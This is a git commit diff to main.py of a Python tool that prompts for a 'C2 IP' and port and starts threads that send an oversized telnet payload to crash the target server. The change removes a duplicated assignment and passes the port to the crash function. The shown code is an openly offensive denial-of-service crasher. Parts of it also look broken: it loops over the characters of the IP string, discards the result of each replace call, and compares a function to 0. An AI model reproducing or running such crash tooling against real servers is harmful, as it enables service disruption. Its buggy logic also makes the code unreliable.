eaeee7f95735191f4f6bfa48782ef9777f732168
void <46201891+VoidLSD@users.noreply.github.com>
2020-10-05 19:32:59 -0700

    Update main.py

--- main.py
+++ main.py
@@ -25,7 +25,7 @@ print(intro)
 
 c2ip = input(("C2 IP: "))
 c2port = input(("C2 Port: "))
-payload = payload = "void"+"d"*9999
+payload = "void"+"d"*9999
 timeout = 3
 tn = telnetlib.Telnet()
 
@@ -37,7 +37,7 @@ for crasher in c2ip:
 	crasher.replace("https://", "")
 	crasher.replace("http://", "")
 	crasher.replace("/", "")
-	crasher2 = Thread(target=crash, args=(c2ip,))
+	crasher2 = Thread(target=crash, args=(c2ip, c2port))
 	crasher2.start()
 	if crash == 0:
 		print(Fore.GREEN+"C2 has been successfully crashed!")
